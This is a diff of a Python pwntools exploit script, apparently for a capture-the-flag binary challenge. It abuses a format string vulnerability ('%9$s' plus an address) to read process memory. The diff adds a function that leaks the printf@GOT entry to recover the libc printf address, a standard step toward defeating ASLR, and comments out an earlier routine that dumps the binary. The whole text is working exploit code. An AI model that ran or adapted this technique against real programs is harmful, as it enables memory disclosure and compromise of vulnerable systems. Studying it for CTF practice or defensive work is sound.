@@ -77,7 +77,8 @@ def leak_pointer_to_main():
 
 def search_elf_magic_bytes(leaked_main,addr):
 	'''Search through the process memory to find ELF magic bytes: \x7fELF.'''
-	#%8$p is the repeated string pararmeter of the first input string, so we print from the 9th pararmter
+	#%8$p is the repeated string pararmeter of the first input string, so we print from the 9th pararmter:
+	#%9$s+address, will print out string on the address
 	while True:
 		leak_part = b"%9$sEOF" + b"\x00"
 		try:
@@ -126,4 +127,19 @@ def dump_binary(magic_bytes_addr):
 			offset = len(leaked)
 
 # Dump binary:
-dump_binary(start_main_addr)
+#dump_binary(start_main_addr)
+
+# After reversing - 0x00003fa8
+def leak_printf_got(start_main_addr):
+	'''Leak printf@GOT - which is dynamically linked during runtime'''
+	#ninja -> sub_1100 -> jmp data_3fa8 -> 0x3fa8
+	printf_GOT = 0x00003fa8
+	printf_addr = start_main_addr + printf_GOT
+	print("Leaked printf address: " + hex(printf_addr))
+	leak_part = b"%9$sEOF\x00"
+	io.sendline(leak_part + p64(printf_addr))
+	res = io.recv() #until(b"1. Scream.\n2. Run outside.\n> ")
+	leak = res.split(b"EOF")[0] + b"\x00"
+	libc_printf = hex(u64(leak.ljust(8,b"\x00")))
+	print("[!!!] Leaked libc printf : " + libc_printf)
+	return int(libc_printf,16)
